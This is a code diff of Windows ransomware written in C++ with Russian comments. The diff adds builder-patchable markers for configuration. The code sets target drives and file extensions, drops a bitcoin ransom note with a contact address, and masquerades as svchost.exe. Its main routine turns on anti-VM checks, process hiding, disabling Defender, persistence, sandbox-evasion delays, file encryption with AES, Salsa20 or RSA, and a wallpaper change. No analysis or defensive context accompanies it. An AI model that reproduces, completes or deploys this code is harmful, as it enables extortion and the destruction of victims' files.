@@ -18,26 +18,45 @@
 #pragma comment(lib, "crypt32.lib")
 
 // ============================================================
-// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ДЛЯ ПАТЧИНГА (С ФИКСИРОВАННЫМИ РАЗМЕРАМИ)
+// ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ С МАРКЕРАМИ ДЛЯ ПАТЧИНГА
 // ============================================================
-char g_Drives[256] = "C:\\|D:\\";
-char g_Exts[1024] = ".txt|.doc|.docx|.xls|.xlsx|.ppt|.pptx|.pdf|.jpg|.jpeg|.png|.gif|.bmp|.zip|.rar|.7z|.tar|.gz|.db|.sql|.sqlite|.pem|.key|.crt|.pfx|.p12|.cs|.cpp|.c|.h|.java|.class|.py|.js|.html|.css|.php|.asp|.xml|.json|.log|.bak|.old|.tmp";
+// МАРКЕРЫ: каждая переменная начинается с уникальной сигнатуры
+// Библиотека патчинга ищет эти маркеры в бинарнике
+
+#pragma data_seg(".rdata")
+const char MARKER_DRIVES[] = "####DRIVES_START####";
+const char MARKER_EXTS[] = "####EXTS_START####";
+const char MARKER_EXCLUDE[] = "####EXCLUDE_START####";
+const char MARKER_INCLUDE[] = "####INCLUDE_START####";
+const char MARKER_ENC_EXT[] = "####ENC_EXT_START####";
+const char MARKER_NOTE_NAME[] = "####NOTE_NAME_START####";
+const char MARKER_NOTE_CONTENT[] = "####NOTE_CONTENT_START####";
+const char MARKER_FAKE_NAME[] = "####FAKE_NAME_START####";
+const char MARKER_WALL_BASE64[] = "####WALL_BASE64_START####";
+const char MARKER_WALL_EXT[] = "####WALL_EXT_START####";
+#pragma data_seg()
+
+// Сами переменные (идут СРАЗУ за маркерами)
+char g_Drives[512] = "C:\\|D:\\";
+char g_Exts[2048] = ".txt|.doc|.docx|.xls|.xlsx|.ppt|.pptx|.pdf|.jpg|.jpeg|.png|.gif|.bmp|.zip|.rar|.7z|.tar|.gz|.db|.sql|.sqlite|.pem|.key|.crt|.pfx|.p12|.cs|.cpp|.c|.h|.java|.class|.py|.js|.html|.css|.php|.asp|.xml|.json|.log|.bak|.old|.tmp";
 char g_Exclude[1024] = "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)|C:\\ProgramData|C:\\System Volume Information|$Recycle.Bin";
-char g_EncryptedExt[16] = ".enc";
-char g_WallpaperBase64[16384] = "";
-char g_WallpaperExt[8] = ".jpg";
+char g_Include[1024] = "";
+char g_EncryptedExt[32] = ".enc";
 char g_NoteName[64] = "READ_ME.txt";
 char g_NoteContent[4096] = "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com";
 char g_FakeName[64] = "svchost.exe";
-char g_IncludeFolders[1024] = "";
-unsigned char g_FakeEnabled = 0;
-unsigned char g_HideEnabled = 0;
-unsigned char g_AntiVM = 0;
-unsigned char g_DisableDefender = 0;
-unsigned char g_Persistence = 0;
-unsigned char g_HideFiles = 0;
-unsigned char g_SandboxDelay = 0;
-unsigned char g_Algo = 0; // 0=AES, 1=Salsa20, 2=RSA
+char g_WallpaperBase64[16384] = "";
+char g_WallpaperExt[16] = ".jpg";
+
+// Булевы переменные (хранятся как char)
+char g_Algo = '0';              // '0'=AES, '1'=Salsa20, '2'=RSA
+char g_FakeEnabled = '0';
+char g_HideEnabled = '0';
+char g_AntiVM = '0';
+char g_DisableDefender = '0';
+char g_Persistence = '0';
+char g_HideFiles = '0';
+char g_SandboxDelay = '0';
 
 // ============================================================
 // AES-256-CBC (Windows CryptoAPI)
@@ -105,7 +124,7 @@ public:
 };
 
 // ============================================================
-// SALSA20 (упрощенная версия для демонстрации)
+// SALSA20
 // ============================================================
 class Salsa20 {
 private:
@@ -130,7 +149,7 @@ public:
 };
 
 // ============================================================
-// RSA (упрощенная версия)
+// RSA
 // ============================================================
 class RSA_Encrypt {
 private:
@@ -416,34 +435,36 @@ void drop_notes(const std::vector<std::string>& drives,
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     srand(GetTickCount() ^ GetCurrentProcessId());
     
+    // Чтение настроек из глобальных переменных
+    int algo = g_Algo - '0';  // Преобразуем char в int
+    
     // Anti-VM
-    if (g_AntiVM && detect_vm()) return 0;
+    if (g_AntiVM == '1' && detect_vm()) return 0;
     
     // Маскировка
-    if (g_FakeEnabled) fake_process_name();
-    if (g_HideEnabled) hide_process();
+    if (g_FakeEnabled == '1') fake_process_name();
+    if (g_HideEnabled == '1') hide_process();
     
     // Отключение Defender
-    if (g_DisableDefender) disable_defender();
+    if (g_DisableDefender == '1') disable_defender();
     
     // Персистентность
-    if (g_Persistence) add_persistence();
+    if (g_Persistence == '1') add_persistence();
     
     // Задержка для обхода песочниц
-    if (g_SandboxDelay) Sleep(60000);
+    if (g_SandboxDelay == '1') Sleep(60000);
     
     // Парсинг настроек
     std::string drives_str = g_Drives;
     std::string exts_str = g_Exts;
     std::string exclude_str = g_Exclude;
-    std::string include_str = g_IncludeFolders;
+    std::string include_str = g_Include;
     std::string encrypted_ext = g_EncryptedExt;
     
     auto drives = split_string(drives_str, '|');
     auto extensions = split_string(exts_str, '|');
     auto exclude_folders = split_string(exclude_str, '|');
     auto include_folders = split_string(include_str, '|');
-    int algo = g_Algo;
     
     // Если указаны конкретные папки для шифрования
     std::vector<std::string> targets = drives;
@@ -460,7 +481,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     for (auto& t : threads) t.join();
     
     // Скрытие зашифрованных файлов
-    if (g_HideFiles) hide_files(encrypted_ext);
+    if (g_HideFiles == '1') hide_files(encrypted_ext);
     
     // Размещение записок
     std::string note_name = g_NoteName;
@@ -468,7 +489,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     drop_notes(drives, exclude_folders, note_name, note_content);
     
     // Установка обоев
-    set_wallpaper(g_WallpaperBase64, g_WallpaperExt);
+    std::string wall_base64 = g_WallpaperBase64;
+    std::string wall_ext = g_WallpaperExt;
+    set_wallpaper(wall_base64, wall_ext);
     
     return 0;
 }
